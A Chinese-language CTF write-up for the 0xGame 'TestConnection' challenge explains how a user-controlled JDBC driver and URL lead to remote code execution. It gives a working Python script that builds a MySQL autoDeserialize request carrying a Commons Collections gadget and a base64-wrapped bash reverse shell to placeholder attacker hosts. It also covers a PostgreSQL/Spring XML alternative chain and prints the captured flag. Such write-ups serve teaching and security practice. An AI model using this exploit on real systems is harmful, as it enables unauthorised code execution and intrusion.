# TestConnection

## 题目简述

`/testConnection` 允许用户控制 JDBC 驱动类、JDBC URL、用户名和密码，后端依次执行 `Class.forName(driver)` 与 `DriverManager.getConnection(url, username, password)`。应用打包了 MySQL Connector/J `8.0.11`、PostgreSQL JDBC `42.3.1` 和 Commons Collections `3.2.1`，因此可以诱导旧版驱动连接攻击者控制的服务并触发反序列化或远程 XML 加载。

## 解题过程

### 确认调用方式与依赖

反编译 `IndexController` 得到核心代码：

```java
Class.forName(driver);
DriverManager.getConnection(url, username, password);
```

这里的四个参数均来自 `/testConnection` 的查询参数。MySQL 路径的关键条件是：

- 驱动为 `com.mysql.cj.jdbc.Driver`；
- JDBC URL 开启 `autoDeserialize=true`；
- 使用 `ServerStatusDiffInterceptor` 触发对恶意服务端数据的反序列化；
- 类路径中的 Commons Collections `3.2.1` 提供可用 gadget；
- 后端把 `username` 单独传给 `getConnection`，所以必须把恶意用户名放在 HTTP 的 `username` 参数中，不能只写进 JDBC URL。

### 构造 MySQL 反序列化请求

可以使用 [4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server) 搭建题目授权范围内的恶意 MySQL 服务。该工具实现了必要的 MySQL 协议，可按用户名中的 `deser_<gadget>_<command>` 规则选择 gadget 并返回序列化载荷；命令行版本可监听指定端口：

```powershell
java -jar ".\fake-mysql-cli.jar" -p "<MYSQL_PORT>"
```

下面的脚本生成一次完整请求。它使用占位地址，并由 `urlencode` 对嵌套 JDBC URL 中的 `&` 以及用户名中的特殊字符统一编码，避免它们被外层 HTTP 查询提前拆分：

```python
import base64
from urllib.parse import urlencode

mysql_host = "<ATTACKER_MYSQL_HOST>"
mysql_port = "<MYSQL_PORT>"
shell_host = "<ATTACKER_SHELL_HOST>"
shell_port = "<SHELL_PORT>"

shell = f"bash -i >& /dev/tcp/{shell_host}/{shell_port} 0>&1"
shell_b64 = base64.b64encode(shell.encode()).decode()
command = f"bash -c {{echo,{shell_b64}}}|{{base64,-d}}|{{bash,-i}}"

jdbc_url = (
    f"jdbc:mysql://{mysql_host}:{mysql_port}/test"
    "?autoDeserialize=true"
    "&queryInterceptors="
    "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
)

query = urlencode({
    "driver": "com.mysql.cj.jdbc.Driver",
    "url": jdbc_url,
    "username": "deser_CC31_" + command,
    "password": "unused",
})
print("/testConnection?" + query)
```

发送生成的 URL 后，接口返回 `success`。这只表示 JDBC 调用流程没有在控制器中抛出可见异常，是否真正触发载荷仍应以恶意 MySQL 服务端日志或回连结果为准。

恶意服务端收到目标连接后，根据 `deser_CC31_...` 生成并返回 Commons Collections 载荷：

```text
accept: <TARGET_IP>
username: deser_CC31_<BASE64_COMMAND>
mysql connector version: 8.0.11
mode: deserialization
gadget: CC31
```

在授权环境中接收连接并读取环境变量：

```sh
printenv flag
```

```text
0xGame{17fe878f-cbe3-4bc6-aca9-340fbc61f160}
```

PostgreSQL `42.3.1` 也提供另一条链：把 `socketFactory` 指向 Spring 的 `ClassPathXmlApplicationContext`，把 `socketFactoryArg` 设为攻击者托管的 Spring XML，使连接初始化阶段加载 XML 并实例化带 `init-method="start"` 的 `ProcessBuilder`。两条路径的共同前提都是 JDBC URL 完全可控且目标主动访问攻击者服务；本题任选一条完整利用即可。

## 方法总结

JDBC URL 不只是数据库地址，还会驱动客户端加载拦截器、SocketFactory 等扩展类。该题通过可控 `driver`/`url` 触发旧驱动危险功能，再利用现有依赖完成代码执行。构造请求时最容易出错的是参数层级：JDBC URL 自身含查询字符串，必须作为外层 HTTP 参数整体编码；同时用户名由四参数版 `getConnection` 单独覆盖，必须放在正确位置。
